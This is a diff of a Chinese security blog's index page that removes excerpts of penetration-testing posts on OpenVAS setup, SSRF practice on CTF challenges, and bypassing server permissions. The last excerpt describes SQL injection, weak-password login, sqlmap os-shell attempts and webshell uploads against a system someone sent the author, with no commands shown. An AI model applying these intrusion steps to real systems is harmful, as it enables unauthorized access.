-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/04/06/aspx%E7%AB%99%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8B%89%E9%97%B8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-openvasa使用排坑" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/06/openvasa%E4%BD%BF%E7%94%A8%E6%8E%92%E5%9D%91/">openvasa使用排坑</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/06/openvasa%E4%BD%BF%E7%94%A8%E6%8E%92%E5%9D%91/" class="archive-article-date">
-  	<time datetime="2017-03-06T04:03:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>学校实验课，给分了个openvas使用，本来以为打开用就行了，开源的东西还有点麻烦。不过反正也没用过这种大扫描器，最多用wvs，学一下看看好不好用。等什么时候也用过nessus对比一下。<br>kali下面是直接安装好的，不过要配置。首先配置证书</p>
-        
-          <a class="article-more-a" href="/2017/03/06/openvasa%E4%BD%BF%E7%94%A8%E6%8E%92%E5%9D%91/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/06/openvasa%E4%BD%BF%E7%94%A8%E6%8E%92%E5%9D%91/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-服务器卡权限的绕过" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E6%9D%83%E9%99%90%E7%9A%84%E7%BB%95%E8%BF%87/">服务器卡权限绕过</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E6%9D%83%E9%99%90%E7%9A%84%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2017-03-01T14:47:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>昨天桥西发了一个系统，漏洞奇多。JSP+MYSQL，登陆界面有注入，注入后发现有弱密码账号密码都是1。想有没有办法拿个shell什么的。<br>先是试了sqlmap的os-shell，基本用不了。上传不了文件，命令差不多只能执行dir。然后想还是sqlmap，用file-write写个大马小马，但是写过去都有问题，解析不出来。
-        
-          <a class="article-more-a" href="/2017/03/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E6%9D%83%E9%99%90%E7%9A%84%E7%BB%95%E8%BF%87/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E6%9D%83%E9%99%90%E7%9A%84%E7%BB%95%E8%BF%87/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-终于学一下ssrf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/03/%E7%BB%88%E4%BA%8E%E5%AD%A6%E4%B8%80%E4%B8%8Bssrf/">终于学一下ssrf</a>
-    </h1>
-  
-
-        
-        <a href="/2017/02/03/%E7%BB%88%E4%BA%8E%E5%AD%A6%E4%B8%80%E4%B8%8Bssrf/" class="archive-article-date">
-  	<time datetime="2017-02-03T02:40:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>说什么一周一篇都是扯淡- -，拖延症拖啊拖啊拖。ssrf这个概念好久前就知道，但一直没有实际操作过，这次拿i春秋的两道题学一下。</p>
-        
-          <a class="article-more-a" href="/2017/02/03/%E7%BB%88%E4%BA%8E%E5%AD%A6%E4%B8%80%E4%B8%8Bssrf/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/02/03/%E7%BB%88%E4%BA%8E%E5%AD%A6%E4%B8%80%E4%B8%8Bssrf/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -617,8 +334,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
